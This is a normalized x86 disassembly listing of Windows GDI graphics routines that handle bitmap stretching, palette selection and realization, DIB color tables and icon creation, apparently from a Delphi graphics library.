push sub_46ee1e
push [ fs : eax ]
mov [ fs : eax ] esp
lea eax [ ebp - 0x34 ]
push eax
push 0x18
mov eax [ ebp - 0x4 ]
push eax
call GetObjectW
test bl bl
je r-xdata
push 0x0
call GetDC
mov [ ebp - 0x14 ] eax
cmp [ ebp - 0x14 ] 0x0
jne r-xdata
push 0x0
push 0x1
push 0x1
mov eax [ ebp - 0x8 ]
push eax
mov eax [ ebp - 0xc ]
push eax
call CreateBitmap
mov [ ebp - 0x10 ] eax
jmp r-xdata
xor eax eax
push ebp
push sub_46ed8d
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x8 ]
push eax
mov eax [ ebp - 0xc ]
push eax
mov eax [ ebp - 0x14 ]
push eax
call CreateCompatibleBitmap
mov [ ebp - 0x10 ] eax
cmp [ ebp - 0x10 ] 0x0
jne r-xdata
call sub_46ec18
cmp [ ebp - 0x10 ] 0x0
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x14 ]
push eax
push 0x0
call ReleaseDC
retn
call sub_46ec18
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_46ee25
mov eax [ ebp - 0x18 ]
push eax
call DeleteDC
mov eax [ ebp - 0x1c ]
push eax
call DeleteDC
retn
mov eax [ ebp - 0x4 ]
push eax
mov eax [ ebp - 0x18 ]
push eax
call SelectObject
mov ebx eax
mov eax [ ebp - 0x10 ]
push eax
mov eax [ ebp - 0x1c ]
push eax
call SelectObject
mov esi eax
push 0xcc0020
mov eax [ ebp - 0x2c ]
push eax
mov eax [ ebp - 0x30 ]
push eax
push 0x0
push 0x0
mov eax [ ebp - 0x18 ]
push eax
mov eax [ ebp - 0x8 ]
push eax
mov eax [ ebp - 0xc ]
push eax
push 0x0
push 0x0
mov eax [ ebp - 0x1c ]
push eax
call StretchBlt
test ebx ebx
je r-xdata
test esi esi
je r-xdata
push ebx
mov eax [ ebp - 0x18 ]
push eax
call SelectObject
push esi
mov eax [ ebp - 0x1c ]
push eax
call SelectObject
sub_46ee30
mov edx eax
dec dx
je r-xdata
mov ecx eax
mov eax 0x1
shl eax cl
retn
sub dx 0x3
je r-xdata
sub dx 0x4
jne r-xdata
xor eax eax
retn
sub_46ee50
push ebx
dec ecx
mov ebx eax
imul ebx edx
add ebx ecx
not ecx
and ebx ecx
mov ecx 0x8
mov eax ebx
cdq
idiv ecx
mov ebx eax
mov eax ebx
pop ebx
retn
sub_46ee70
push ebp
mov ebp esp
add esp 0xffffffdc
push ebx
push esi
push edi
mov [ ebp - 0x8 ] ecx
mov [ ebp - 0x4 ] edx
mov edi eax
mov esi [ ebp + 0x14 ]
mov ebx [ ebp + 0x18 ]
mov [ ebp - 0x9 ] 0x1
mov eax [ rw-data ]
cmp [ eax ] 0x2
jne r-xdata
xor eax eax
mov [ ebp - 0x24 ] eax
push 0x0
call CreateCompatibleDC
call sub_46ecc0
mov [ ebp - 0x10 ] eax
xor eax eax
push ebp
push sub_46f0e5
push [ fs : eax ]
mov [ fs : eax ] esp
push esi
push ebx
mov eax [ ebp + 0x24 ]
push eax
call CreateCompatibleBitmap
call sub_46ecc0
mov [ ebp - 0x14 ] eax
mov eax [ ebp - 0x14 ]
push eax
mov eax [ ebp - 0x10 ]
push eax
call SelectObject
mov [ ebp - 0x18 ] eax
push 0x0
mov eax [ rw-data ]
push eax
mov eax [ ebp + 0x24 ]
push eax
call SelectPalette
mov [ ebp - 0x24 ] eax
push 0x0
mov eax [ ebp - 0x24 ]
push eax
mov eax [ ebp + 0x24 ]
push eax
call SelectPalette
cmp [ ebp - 0x24 ] 0x0
je r-xdata
cmp ebx [ ebp + 0x2c ]
jne r-xdata
push 0xffffffff
mov eax [ rw-data ]
push eax
mov eax [ ebp - 0x10 ]
push eax
call SelectPalette
mov [ ebp - 0x24 ] eax
push 0xffffffff
mov eax [ ebp - 0x24 ]
push eax
mov eax [ ebp - 0x10 ]
push eax
call SelectPalette
mov [ ebp - 0x24 ] eax
jmp r-xdata
cmp esi [ ebp + 0x28 ]
jne r-xdata
mov eax [ ebp - 0x14 ]
push eax
call DeleteObject
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_46f0ec
cmp [ ebp - 0x24 ] 0x0
je r-xdata
mov eax [ ebp - 0x18 ]
push eax
mov eax [ ebp - 0x10 ]
push eax
call SelectObject
mov eax [ ebp - 0x10 ]
push eax
call RealizePalette
push 0xcc0020
push esi
push ebx
mov eax [ ebp + 0x8 ]
push eax
mov eax [ ebp + 0xc ]
push eax
mov eax [ ebp + 0x10 ]
push eax
push esi
push ebx
push 0x0
push 0x0
mov eax [ ebp - 0x10 ]
push eax
call StretchBlt
push r-xdata
push esi
push ebx
mov eax [ ebp + 0x1c ]
push eax
mov eax [ ebp + 0x20 ]
push eax
mov eax [ ebp + 0x24 ]
push eax
push esi
push ebx
push 0x0
push 0x0
mov eax [ ebp - 0x10 ]
push eax
call StretchBlt
push 0x0
push edi
call SetTextColor
mov [ ebp - 0x1c ] eax
push 0xffffff
push edi
call SetBkColor
mov [ ebp - 0x20 ] eax
push 0x8800c6
push esi
push ebx
mov eax [ ebp + 0x8 ]
push eax
mov eax [ ebp + 0xc ]
push eax
mov eax [ ebp + 0x10 ]
push eax
mov eax [ ebp + 0x28 ]
push eax
mov eax [ ebp + 0x2c ]
push eax
mov eax [ ebp - 0x8 ]
push eax
mov eax [ ebp - 0x4 ]
push eax
push edi
call StretchBlt
push 0x660046
push esi
push ebx
push 0x0
push 0x0
mov eax [ ebp - 0x10 ]
push eax
mov eax [ ebp + 0x28 ]
push eax
mov eax [ ebp + 0x2c ]
push eax
mov eax [ ebp - 0x8 ]
push eax
mov eax [ ebp - 0x4 ]
push eax
push edi
call StretchBlt
mov eax [ ebp - 0x1c ]
push eax
push edi
call SetTextColor
mov eax [ ebp - 0x20 ]
push eax
push edi
call SetBkColor
cmp [ ebp - 0x18 ] 0x0
je r-xdata
push 0x1
push 0x1
mov eax [ ebp + 0x24 ]
push eax
call CreateCompatibleBitmap
call sub_46ecc0
mov [ ebp - 0x14 ] eax
mov eax [ ebp - 0x14 ]
push eax
mov eax [ ebp + 0x10 ]
push eax
call SelectObject
mov [ ebp - 0x14 ] eax
xor eax eax
push ebp
push sub_46ef38
push [ fs : eax ]
mov [ fs : eax ] esp
push 0xccaa0029
mov eax [ ebp + 0x8 ]
push eax
mov eax [ ebp + 0xc ]
push eax
mov eax [ ebp - 0x14 ]
push eax
mov eax [ ebp + 0x1c ]
push eax
mov eax [ ebp + 0x20 ]
push eax
mov eax [ ebp + 0x24 ]
push eax
mov eax [ ebp + 0x28 ]
push eax
mov eax [ ebp + 0x2c ]
push eax
mov eax [ ebp - 0x8 ]
push eax
mov eax [ ebp - 0x4 ]
push eax
push edi
call MaskBlt
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_46f0ec
mov eax [ ebp - 0x14 ]
push eax
mov eax [ ebp + 0x10 ]
push eax
call SelectObject
mov [ ebp - 0x14 ] eax
mov eax [ ebp - 0x14 ]
push eax
call DeleteObject
retn
mov eax [ ebp - 0x10 ]
push eax
call DeleteDC
retn
push 0x0
mov eax [ ebp - 0x24 ]
push eax
mov eax [ ebp - 0x10 ]
push eax
call SelectPalette
sub_46f0fc
push ebx
push esi
push edi
mov esi eax
mov edi esi
mov edx 0xff
lea eax [ edi + edx * 4 ]
lea ecx [ edx + edx * 2 ]
lea ecx [ esi + ecx ]
movzx ebx [ ecx + 0x2 ]
mov [ eax + 0x2 ] bl
movzx ebx [ ecx + 0x1 ]
mov [ eax + 0x1 ] bl
movzx ecx [ ecx ]
mov [ eax ] cl
mov [ eax + 0x3 ] 0x0
dec edx
test edx edx
jne r-xdata
mov [ edi + 0x3 ] 0x0
pop edi
pop esi
pop ebx
retn
sub_46f138
push ebx
push esi
push edi
add esp 0xfffffff8
mov [ esp ] edx
mov esi eax
mov [ esp + 0x4 ] esi
mov edi [ esp ]
mov edi [ edi ]
dec edi
test edi edi
jle r-xdata
mov eax [ esp ]
cmp [ eax ] 0x100
jge r-xdata
mov ecx 0x1
pop ecx
pop edx
pop edi
pop esi
pop ebx
retn
mov eax [ esp ]
mov edx 0x100
sub edx [ eax ]
lea edx [ edx + edx * 2 ]
mov eax [ esp ]
mov eax [ eax ]
lea eax [ eax + eax * 2 ]
lea eax [ esi + eax ]
xor ecx ecx
call sub_447ae4
mov eax [ esp ]
mov [ eax ] 0x100
mov eax [ esp + 0x4 ]
lea eax [ eax + ecx * 4 ]
lea edx [ ecx + ecx * 2 ]
lea edx [ esi + edx ]
movzx ebx [ eax + 0x2 ]
mov [ edx + 0x2 ] bl
movzx ebx [ eax + 0x1 ]
mov [ edx + 0x1 ] bl
movzx eax [ eax ]
mov [ edx ] al
inc ecx
dec edi
jne r-xdata
sub_46f1b4
push ebp
mov ebp esp
add esp 0xfffffff4
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov eax [ rw-data ]
movzx eax [ eax ]
mov [ ebp - 0xc ] eax
mov edx [ ebp - 0x4 ]
mov ecx [ ebp - 0x8 ]
dec ecx
js r-xdata
mov esp ebp
pop ebp
retn
cmp [ ebp - 0xc ] 0x2
jle r-xdata
push ebx
mov eax [ edx + ecx * 4 ]
bswap eax
shr eax 0x8
mov [ edx + ecx * 4 ] eax
dec ecx
jns r-xdata
xor ebx ebx
mov eax [ edx + ecx * 4 ]
mov bh al
mov bl ah
shr eax 0x10
shl ebx 0x8
mov bl al
mov [ edx + ecx * 4 ] ebx
dec ecx
jns r-xdata
pop ebx
jmp r-xdata
sub_46f208
push ebp
mov ebp esp
add esp 0xfffffbf8
push ebx
mov [ ebp - 0x408 ] 0x300
mov [ ebp - 0x406 ] 0x10
lea edx [ ebp - 0x404 ]
mov ecx 0x40
call sub_4476cc
push 0x0
call GetDC
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_46f305
push [ fs : eax ]
mov [ fs : eax ] esp
push 0x68
mov eax [ ebp - 0x4 ]
push eax
call GetDeviceCaps
mov ebx eax
cmp ebx 0x10
jl r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_46f30c
mov eax [ ebp - 0x4 ]
push eax
push 0x0
call ReleaseDC
retn
lea eax [ ebp - 0x404 ]
push eax
push 0x8
push 0x0
mov eax [ ebp - 0x4 ]
push eax
call GetSystemPaletteEntries
cmp [ ebp - 0x3e8 ] 0xc0c0c0
jne r-xdata
movzx eax [ ebp - 0x406 ]
lea eax [ ebp + eax * 4 - 0x424 ]
push eax
push 0x8
sub ebx 0x8
push ebx
mov eax [ ebp - 0x4 ]
push eax
call GetSystemPaletteEntries
lea eax [ ebp - 0x3e8 ]
push eax
push 0x1
mov eax ebx
sub eax 0x8
push eax
mov eax [ ebp - 0x4 ]
push eax
call GetSystemPaletteEntries
movzx eax [ ebp - 0x406 ]
lea eax [ ebp + eax * 4 - 0x420 ]
push eax
push 0x7
sub ebx 0x7
push ebx
mov eax [ ebp - 0x4 ]
push eax
call GetSystemPaletteEntries
lea eax [ ebp - 0x3e4 ]
push eax
push 0x1
push 0x7
mov eax [ ebp - 0x4 ]
push eax
call GetSystemPaletteEntries
jmp r-xdata
sub_46f320
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
mov ebx eax
mov [ ebp - 0x1 ] 0x0
cmp [ rw-data ] 0x0
je r-xdata
movzx eax [ ebp - 0x1 ]
pop ebx
pop ecx
pop ecx
pop ebp
retn
push 0x0
call GetDC
mov [ ebp - 0x8 ] eax
xor edx edx
push ebp
push sub_46f3a6
push [ fs : edx ]
mov [ fs : edx ] esp
push 0x68
mov eax [ ebp - 0x8 ]
push eax
call GetDeviceCaps
cmp eax 0x10
jl r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x8 ]
push eax
push 0x0
call ReleaseDC
retn
lea eax [ ebx + 0x4 ]
push eax
push 0x8
push 0x0
mov eax [ rw-data ]
push eax
call GetPaletteEntries
movzx eax [ ebx + 0x2 ]
lea eax [ ebx + eax * 4 - 0x1c ]
push eax
push 0x8
push 0x8
mov eax [ rw-data ]
push eax
call GetPaletteEntries
mov [ ebp - 0x1 ] 0x1
sub_46f3b8
push ebx
push esi
push edi
add esp 0xfffffbfc
mov edi eax
xor esi esi
mov [ esp ] 0x300
test edi edi
je r-xdata
mov [ esp + 0x2 ] cx
mov eax edx
lea edx [ esp + 0x4 ]
add ecx ecx
add ecx ecx
call sub_4476cc
push 0x0
call CreateCompatibleDC
mov ebx eax
push edi
push ebx
call SelectObject
mov edi eax
lea eax [ esp + 0x4 ]
push eax
push 0x100
push 0x0
push ebx
call GetDIBColorTable
mov [ esp + 0x2 ] ax
push edi
push ebx
call SelectObject
push ebx
call DeleteDC
jmp r-xdata
mov eax esi
add esp 0x404
pop edi
pop esi
pop ebx
retn
cmp [ esp + 0x2 ] 0x10
jne r-xdata
cmp [ esp + 0x2 ] 0x0
je r-xdata
movzx edx [ esp + 0x2 ]
lea eax [ esp + 0x4 ]
call sub_46f1b4
mov eax esp
call sub_46f320
test al al
jne r-xdata
mov eax esp
push eax
call CreatePalette
mov esi eax
sub_46f45c
push ebx
push esi
push edi
push ecx
mov edi ecx
mov esi edx
mov ebx eax
xor eax eax
mov [ esp ] eax
test ebx ebx
je r-xdata
mov eax [ esp ]
pop edx
pop edi
pop esi
pop ebx
retn
push esp
push 0x4
push ebx
call GetObjectW
test eax eax
je r-xdata
cmp [ esp ] 0x0
je r-xdata
mov eax edi
inc eax
cmp eax [ esp ]
jge r-xdata
push esi
mov eax [ esp + 0x4 ]
push eax
push 0x0
push ebx
call GetPaletteEntries
mov eax esi
mov edx [ esp ]
call sub_46f1b4
mov [ esp ] eax
sub_46f4b0
push ebp
mov ebp esp
add esp 0xffffffec
push ebx
push esi
push edi
mov [ ebp - 0x8 ] ecx
mov ebx edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
shr [ eax + 0x8 ] 0x1
mov edx [ ebp - 0x4 ]
movzx edx [ edx + 0xe ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
mov ecx 0x20
call sub_46ee50
mov edx [ ebp - 0x4 ]
imul [ edx + 0x8 ]
mov edx [ ebp - 0x4 ]
mov [ edx + 0x14 ] eax
mov eax [ ebp - 0x4 ]
movzx eax [ eax + 0xe ]
call sub_46ee30
mov esi eax
push 0x0
call GetDC
mov [ ebp - 0x10 ] eax
cmp [ ebp - 0x10 ] 0x0
jne r-xdata
xor edx edx
push ebp
push sub_46f65d
push [ fs : edx ]
mov [ fs : edx ] esp
mov edi [ ebp - 0x4 ]
mov eax edi
add eax 0x28
mov edx esi
add edx edx
add edx edx
add eax edx
mov [ ebp - 0x14 ] eax
push 0x0
mov eax [ ebp - 0x4 ]
push edi
mov eax [ ebp - 0x14 ]
push eax
push 0x4
mov eax [ ebp - 0x4 ]
push eax
mov eax [ ebp - 0x10 ]
push eax
call CreateDIBitmap
call sub_46ecc0
mov [ ebp - 0xc ] eax
xor eax eax
push ebp
push sub_46f583
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx [ ebp + 0x8 ]
xor ecx ecx
mov eax [ ebp - 0xc ]
call sub_46ecd0
mov [ ebx ] eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_46f58a
mov eax [ ebp - 0xc ]
push eax
call DeleteObject
retn
call sub_46ebc4
sub_46f58a
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x14 ]
add [ ebp - 0x14 ] eax
mov eax [ ebp - 0x4 ]
mov bx 0x1
mov [ eax + 0xe ] bx
mov eax [ ebp - 0x4 ]
movzx edx bx
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
mov ecx 0x20
call sub_46ee50
mov edx [ ebp - 0x4 ]
imul [ edx + 0x8 ]
mov edx [ ebp - 0x4 ]
mov [ edx + 0x14 ] eax
mov eax [ ebp - 0x4 ]
mov [ eax + 0x20 ] 0x2
mov eax [ ebp - 0x4 ]
mov [ eax + 0x24 ] 0x2
mov eax [ ebp - 0x4 ]
add eax 0x28
xor edx edx
mov [ eax ] edx
mov [ eax + 0x4 ] 0xffffff
push 0x0
mov ebx [ ebp - 0x4 ]
push ebx
mov eax [ ebp - 0x14 ]
push eax
push 0x4
mov eax [ ebp - 0x4 ]
push ebx
mov eax [ ebp - 0x10 ]
push eax
call CreateDIBitmap
call sub_46ecc0
mov [ ebp - 0xc ] eax
xor eax eax
push ebp
push sub_46f63d
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx [ ebp + 0x8 ]
mov cl 0x1
mov eax [ ebp - 0xc ]
call sub_46ecd0
mov edx [ ebp - 0x8 ]
mov [ edx ] eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_46f644
mov eax [ ebp - 0xc ]
push eax
call DeleteObject
retn
sub_46f67c
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
mov [ ebp - 0x4 ] eax
movzx ecx [ edx ]
mov eax [ ebp + 0x8 ]
mov eax [ eax + 0x8 ]
mov eax [ eax ]
sub ecx eax
movzx ebx [ edx + 0x1 ]
mov edx [ ebp + 0x8 ]
mov edx [ edx + 0x8 ]
sub ebx [ edx + 0x4 ]
mov esi [ ebp - 0x4 ]
movzx esi [ esi ]
mov edx [ ebp + 0x8 ]
mov edx [ edx + 0x8 ]
sub esi eax
mov eax [ ebp - 0x4 ]
movzx eax [ eax + 0x1 ]
mov edx [ ebp + 0x8 ]
mov edx [ edx + 0x8 ]
sub eax [ edx + 0x4 ]
mov [ ebp - 0x8 ] eax
mov eax ecx
cdq
xor eax edx
sub eax edx
mov edi eax
mov eax esi
cdq
xor eax edx
sub eax edx
cmp edi eax
jg r-xdata
xor eax eax
jmp r-xdata
test ecx ecx
jle r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
mov eax ebx
cdq
xor eax edx
sub eax edx
mov ecx eax
mov eax [ ebp - 0x8 ]
cdq
xor eax edx
sub eax edx
cmp ecx eax
jg r-xdata
cmp esi ecx
jl r-xdata
test ebx ebx
jle r-xdata
mov al 0x1
cmp ebx [ ebp - 0x8 ]
jle r-xdata
sub_46f70c
push ebp
mov ebp esp
add esp 0xffffff90
push ebx
push esi
push edi
mov [ ebp - 0xc ] ecx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov ebx [ ebp + 0xc ]
mov eax [ ebp - 0xc ]
shl eax 0x4
mov [ ebp - 0x14 ] eax
mov eax [ ebp - 0x14 ]
call sub_447474
mov [ ebp - 0x10 ] eax
xor edx edx
push ebp
push sub_46fa05
push [ fs : edx ]
mov [ fs : edx ] esp
mov edx [ ebp - 0x10 ]
mov ecx [ ebp - 0x14 ]
mov eax [ ebp - 0x4 ]
mov esi [ eax ]
call [ esi + 0xc ]
mov eax [ ebx ]
or eax [ ebx + 0x4 ]
jne r-xdata
mov eax [ ebp + 0x8 ]
mov edx [ ebx ]
mov [ eax ] edx
mov edx [ ebx + 0x4 ]
mov [ eax + 0x4 ] edx
push 0xb
call GetSystemMetrics
mov edx [ ebp + 0x8 ]
mov [ edx ] eax
push 0xc
call GetSystemMetrics
mov edx [ ebp + 0x8 ]
mov [ edx + 0x4 ] eax
jmp r-xdata
xor edx edx
push ebp
push sub_46f7f5
push [ fs : edx ]
mov [ fs : edx ] esp
push 0xe
mov eax [ ebp - 0x28 ]
push eax
call GetDeviceCaps
mov ebx eax
push 0xc
mov eax [ ebp - 0x28 ]
push eax
call GetDeviceCaps
imul bx ax
mov eax ebx
cmp ax 0x8
jbe r-xdata
call sub_46ebc4
push 0x0
call GetDC
mov [ ebp - 0x28 ] eax
cmp [ ebp - 0x28 ] 0x0
jne r-xdata
mov ecx eax
mov eax 0x1
shl eax cl
mov [ ebp - 0x1c ] eax
mov [ ebp - 0x1c ] 0x7fffffff
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_46f7fc
mov eax [ ebp - 0x28 ]
push eax
push 0x0
call ReleaseDC
retn
sub_46f7fc
xor eax eax
mov [ ebp - 0x24 ] eax
mov eax [ ebp - 0x10 ]
movzx eax [ eax + 0x2 ]
call sub_46f670
mov [ ebp - 0x20 ] eax
mov edi [ ebp - 0xc ]
dec edi
test edi edi
jle r-xdata
mov eax [ ebp - 0x24 ]
add eax eax
mov edx [ ebp - 0x10 ]
lea eax [ edx + eax * 8 ]
mov [ ebp - 0x40 ] eax
mov eax [ ebp - 0x40 ]
movzx eax [ eax ]
mov edx [ ebp + 0x8 ]
mov [ edx ] eax
mov eax [ ebp - 0x40 ]
movzx eax [ eax + 0x1 ]
mov edx [ ebp + 0x8 ]
mov [ edx + 0x4 ] eax
mov eax [ ebp - 0x40 ]
mov eax [ eax + 0x8 ]
call sub_447474
mov [ ebp - 0x2c ] eax
xor eax eax
push ebp
push sub_46f9e5
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x40 ]
mov edx [ eax + 0xc ]
mov eax [ ebp - 0x14 ]
add eax [ ebp + 0x10 ]
sub edx eax
mov cx 0x1
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x14 ]
mov eax [ ebp - 0x40 ]
mov ecx [ eax + 0x8 ]
mov ebx [ ebp - 0x2c ]
mov edx ebx
mov eax [ ebp - 0x4 ]
mov esi [ eax ]
call [ esi + 0xc ]
mov eax [ ebp + 0x8 ]
push eax
lea ecx [ ebp - 0x38 ]
lea edx [ ebp - 0x34 ]
mov eax ebx
call sub_46f4b0
lea eax [ ebp - 0x70 ]
push eax
push 0x18
mov eax [ ebp - 0x38 ]
push eax
call GetObjectW
lea eax [ ebp - 0x58 ]
push eax
push 0x18
mov eax [ ebp - 0x34 ]
push eax
call GetObjectW
mov ebx [ ebp - 0x64 ]
imul ebx [ ebp - 0x68 ]
movzx eax [ ebp - 0x60 ]
imul ebx eax
mov eax [ ebp - 0x4c ]
imul [ ebp - 0x50 ]
movzx edx [ ebp - 0x48 ]
imul edx
mov [ ebp - 0x3c ] eax
mov eax [ ebp - 0x3c ]
add eax ebx
mov [ ebp - 0x18 ] eax
mov eax [ ebp - 0x18 ]
call sub_447474
mov [ ebp - 0x30 ] eax
xor eax eax
push ebp
push sub_46f9c2
push [ fs : eax ]
mov [ fs : eax ] esp
mov edi [ ebp - 0x30 ]
mov esi [ ebp - 0x30 ]
add esi ebx
push edi
push ebx
mov eax [ ebp - 0x38 ]
push eax
call GetBitmapBits
push esi
mov eax [ ebp - 0x3c ]
push eax
mov eax [ ebp - 0x34 ]
push eax
call GetBitmapBits
mov eax [ ebp - 0x34 ]
push eax
call DeleteObject
mov eax [ ebp - 0x38 ]
push eax
call DeleteObject
push esi
push edi
movzx eax [ ebp - 0x46 ]
push eax
movzx eax [ ebp - 0x48 ]
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax + 0x4 ]
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax ]
push eax
mov eax [ rw-data ]
push eax
call CreateIcon
mov edx [ ebp - 0x8 ]
mov [ edx ] eax
mov eax [ ebp - 0x8 ]
cmp [ eax ] 0x0
jne r-xdata
mov esi 0x1
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_46f9c9
mov edx [ ebp - 0x18 ]
mov eax [ ebp - 0x30 ]
call sub_4474a8
retn
call sub_46ec18
inc esi
dec edi
jne r-xdata
cmp ebx [ ebp - 0x20 ]
jl r-xdata
mov eax esi
add eax eax
mov edx [ ebp - 0x10 ]
movzx eax [ edx + eax * 8 + 0x2 ]
call sub_46f670
mov ebx eax
cmp ebx [ ebp - 0x1c ]
jg r-xdata
push ebp
mov eax esi
add eax eax
mov edx [ ebp - 0x10 ]
lea edx [ edx + eax * 8 ]
mov eax [ ebp - 0x24 ]
add eax eax
mov ecx [ ebp - 0x10 ]
lea eax [ ecx + eax * 8 ]
call sub_46f67c
pop ecx
test al al
je r-xdata
mov [ ebp - 0x24 ] esi
mov [ ebp - 0x20 ] ebx
sub_46fa18
push ebx
push esi
push edi
add esp 0xffffffac
mov esi ecx
mov ebx edx
xor edx edx
mov [ esp + 0x18 ] edx
push esp
push 0x54
push eax
call GetObjectW
test eax eax
jne r-xdata
cmp eax 0x40
jl r-xdata
call sub_46ebac
jmp r-xdata
mov eax ebx
xor ecx ecx
mov edx 0x28
call sub_447ae4
mov [ ebx ] 0x28
mov eax [ esp + 0x4 ]
mov [ ebx + 0x4 ] eax
mov eax [ esp + 0x8 ]
mov [ ebx + 0x8 ] eax
cmp [ esp + 0x18 ] 0x28
jb r-xdata
mov eax esi
sub eax 0x2
je r-xdata
mov [ ebx + 0xe ] 0x1
jmp r-xdata
dec eax
sub eax 0xe
jb r-xdata
push esi
mov edi ebx
lea esi [ esp + 0x1c ]
mov ecx 0xa
[ edi ] [ esi ]
pop esi
jmp r-xdata
mov [ ebx + 0xc ] 0x1
mov eax [ ebx + 0x20 ]
cmp eax [ ebx + 0x24 ]
jae r-xdata
mov [ ebx + 0xe ] 0x4
mov [ ebx + 0x20 ] esi
jmp r-xdata
sub eax 0xf0
jb r-xdata
cmp [ ebx + 0x14 ] 0x0
jne r-xdata
mov [ ebx + 0x24 ] eax
mov [ ebx + 0xe ] 0x8
mov [ ebx + 0x20 ] esi
jmp r-xdata
jmp r-xdata
add esp 0x54
pop edi
pop esi
pop ebx
retn
movzx edx [ ebx + 0xe ]
mov eax [ ebx + 0x4 ]
mov ecx 0x20
call sub_46ee50
mov ecx eax
mov eax [ ebx + 0x8 ]
cdq
xor eax edx
sub eax edx
imul ecx eax
mov [ ebx + 0x14 ] ecx
movzx eax [ esp + 0x12 ]
imul [ esp + 0x10 ]
mov [ ebx + 0xe ] ax
sub_46fafc
push ebp
mov ebp esp
add esp 0xffffffd8
push ebx
push esi
mov esi ecx
mov ebx edx
lea edx [ ebp - 0x28 ]
mov ecx [ ebp + 0x8 ]
call sub_46fa18
movzx eax [ ebp - 0x1a ]
cmp ax 0x8
jbe r-xdata
mov edx [ ebp - 0x8 ]
test edx edx
jne r-xdata
mov [ ebx ] 0x28
test [ ebp - 0x18 ] 0x3
je r-xdata
mov eax edx
add eax eax
add eax eax
add eax 0x28
mov [ ebx ] eax
mov ecx eax
mov eax 0x1
shl eax cl
add eax eax
add eax eax
add eax 0x28
mov [ ebx ] eax
jmp r-xdata
mov eax [ ebp - 0x14 ]
mov [ esi ] eax
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
add [ ebx ] 0xc
jmp r-xdata
sub_46fb6c
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
push edi
mov ebx ecx
mov edi edx
mov esi eax
mov edx ebx
mov ecx [ ebp + 0x8 ]
mov eax esi
call sub_46fa18
xor eax eax
mov [ ebp - 0x8 ] eax
push 0x0
call CreateCompatibleDC
mov [ ebp - 0xc ] eax
xor eax eax
push ebp
push sub_46fc09
push [ fs : eax ]
mov [ fs : eax ] esp
test edi edi
je r-xdata
push 0x0
push ebx
mov eax [ ebp + 0xc ]
push eax
mov eax [ ebx + 0x8 ]
push eax
push 0x0
push esi
mov eax [ ebp - 0xc ]
push eax
call GetDIBits
test eax eax
setne [ ebp - 0x1 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_46fc10
cmp [ ebp - 0x8 ] 0x0
je r-xdata
push 0x0
push edi
mov eax [ ebp - 0xc ]
push eax
call SelectPalette
mov [ ebp - 0x8 ] eax
mov eax [ ebp - 0xc ]
push eax
call RealizePalette
mov eax [ ebp - 0xc ]
push eax
call DeleteDC
retn
push 0x0
mov eax [ ebp - 0x8 ]
push eax
mov eax [ ebp - 0xc ]
push eax
call SelectPalette
sub_46fc44
push ebp
mov ebp esp
add esp 0xffffffac
push ebx
push esi
push edi
mov [ ebp - 0x1 ] cl
mov esi edx
mov ebx eax
lea eax [ ebp - 0x2a ]
xor ecx ecx
mov edx 0x6
call sub_447ae4
lea eax [ ebp - 0x54 ]
xor ecx ecx
mov edx 0x10
call sub_447ae4
lea eax [ ebp - 0x44 ]
push eax
push esi
call GetIconInfo
call sub_46fc38
xor edx edx
push ebp
push sub_46fe34
push [ fs : edx ]
mov [ fs : edx ] esp
push 0x2
lea ecx [ ebp - 0x10 ]
lea edx [ ebp - 0x8 ]
mov eax [ ebp - 0x38 ]
call sub_46fafc
push 0xffffffff
lea ecx [ ebp - 0x14 ]
lea edx [ ebp - 0xc ]
mov eax [ ebp - 0x34 ]
call sub_46fafc
xor eax eax
mov [ ebp - 0x18 ] eax
xor eax eax
mov [ ebp - 0x1c ] eax
xor eax eax
mov [ ebp - 0x20 ] eax
xor eax eax
mov [ ebp - 0x24 ] eax
xor edx edx
push ebp
push sub_46fe0d
push [ fs : edx ]
mov [ fs : edx ] esp
mov eax [ ebp - 0x8 ]
call sub_447474
mov [ ebp - 0x18 ] eax
mov eax [ ebp - 0x10 ]
call sub_447474
mov [ ebp - 0x1c ] eax
mov eax [ ebp - 0xc ]
call sub_447474
mov [ ebp - 0x20 ] eax
mov eax [ ebp - 0x14 ]
call sub_447474
mov [ ebp - 0x24 ] eax
mov eax [ ebp - 0x1c ]
push eax
push 0x2
mov ecx [ ebp - 0x18 ]
xor edx edx
mov eax [ ebp - 0x38 ]
call sub_46fb6c
mov eax [ ebp - 0x24 ]
push eax
push 0xffffffff
mov ecx [ ebp - 0x20 ]
xor edx edx
mov eax [ ebp - 0x34 ]
call sub_46fb6c
